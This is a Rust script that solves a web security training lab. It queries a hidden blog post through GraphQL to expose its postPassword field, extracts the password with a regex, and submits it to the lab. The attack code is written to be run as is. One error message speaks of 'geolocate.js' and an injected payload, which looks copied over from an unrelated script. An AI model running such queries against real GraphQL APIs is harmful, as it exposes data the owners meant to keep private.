/****************************************
*
* Lab: Accessing private GraphQL posts
*
* Hack Steps:
*      1. Query the hidden post
*      2. Extract the password
*      3. Submitt the solution
*
*****************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a9a00cb03a598998046bd43000d0067.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Querying the hidden post.. ");
    flush_terminal();

    let payload = r###"query getBlogSummaries {
                            getBlogPost(id: 3) {
                                postPassword
                            }
                        }"###;
    let query = query_hidden_post(payload);

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the password.. ");
    flush_terminal();

    let query_result = query.text().unwrap();
    let password = capture_pattern_from_text(r###""postPassword": "(\w*)""###, &query_result);

    println!("{} => {}", "OK".green(), password.yellow());
    print!("⦗3⦘ Submitting the solution.. ");
    flush_terminal();

    submit_solution(&password);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn query_hidden_post(payload: &str) -> Response {
    let body_json =
        format!(r###"{{ "query": "{payload}", "operationName": "getBlogSummaries" }}"###);

    WEB_CLIENT
        .post(format!("{LAB_URL}/graphql/v1"))
        .header("Content-Type", "application/json")
        .body(body_json)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the geolocate.js file with the injected payload".red()
        ))
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
